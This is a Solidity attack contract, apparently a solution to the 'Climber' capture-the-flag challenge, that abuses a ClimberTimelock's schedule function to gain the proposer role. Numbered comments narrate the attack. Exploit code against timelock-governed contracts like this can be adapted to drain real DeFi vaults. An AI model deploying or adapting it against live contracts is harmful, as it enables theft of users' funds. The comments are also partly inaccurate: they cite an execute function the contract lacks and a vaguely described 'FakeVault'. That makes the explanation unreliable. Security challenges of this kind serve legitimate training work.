//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import {PROPOSER_ROLE} from "./ClimberConstants.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberAttack {
    ClimberTimelock public lock;
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;
    bytes32 public salt;
    bool public hasRole;

    constructor(
        address payable _timeLock,
        uint256[] memory _values,
        bytes32 _salt
    ) {
        lock = ClimberTimelock(_timeLock);
        targets.push(_timeLock);
        targets.push(_timeLock);
        targets.push(address(this));
        values = _values;
        salt = _salt;
    }

    function addData(bytes[] memory _data) public {
        dataElements = _data;
    }

    function hackSchedule() public {
        lock.schedule(targets, values, dataElements, salt);
    }

    function checkRole() public {
        hasRole = lock.hasRole(PROPOSER_ROLE, address(this));
    }

    function schedule(
        address[] calldata _targets,
        uint256[] calldata _values,
        bytes[] calldata _dataElements,
        bytes32 _salt
    ) public {
        lock.schedule(_targets, _values, _dataElements, _salt);
    }
}

// 1. The attacker deploys the ClimberAttack.sol contract and provides the address of the ClimberTimelock contract and other attack parameters like values and salt.

// 2. The ClimberAttack contract sets up the attack parameters and stores the instance of the ClimberTimelock contract in the lock variable.

// 3. The attacker may call the addData function in the ClimberAttack contract to add additional data elements if required for the attack.

// 4. The attacker calls the hackSchedule function in the ClimberAttack contract.

// 5. Inside the hackSchedule function, the ClimberAttack contract calls the schedule function of the ClimberTimelock contract with the attack parameters.

// 6. The schedule function in the ClimberTimelock contract is executed.
//    It verifies the validity of the provided targets, values, and data elements arrays and checks if the operation has not been scheduled before.

// 7. If the validation passes, the schedule function generates an id for the operation using getOperationId and
//    sets the readyAtTimestamp and known properties of the operation.

// 8. The attacker then calls the checkRole function in the ClimberAttack contract to check if it has the PROPOSER_ROLE in the ClimberTimelock contract.

// 9. Finally, the attacker may call the execute function in the ClimberAttack contract to execute the scheduled operation in the ClimberTimelock contract.
//    The execute function verifies the validity of the targets, values, and data elements arrays and checks if the operation is in the ready state.

// 10. If all the conditions pass, the execute function iterates through the targets array and calls the function on each target address
//     with the corresponding value and data element.

// 11. After the execution, the executed property of the operation is set to true in the ClimberTimelock contract.

// 12. The attack leverages vulnerabilities in the FakeVault contract and manipulates the ClimberTimelock contract through the ClimberAttack contract.
//     The specific details of the vulnerabilities and the consequences of the attack would depend on the implementation of the FakeVault contract
//     and any other relevant contracts or external dependencies.
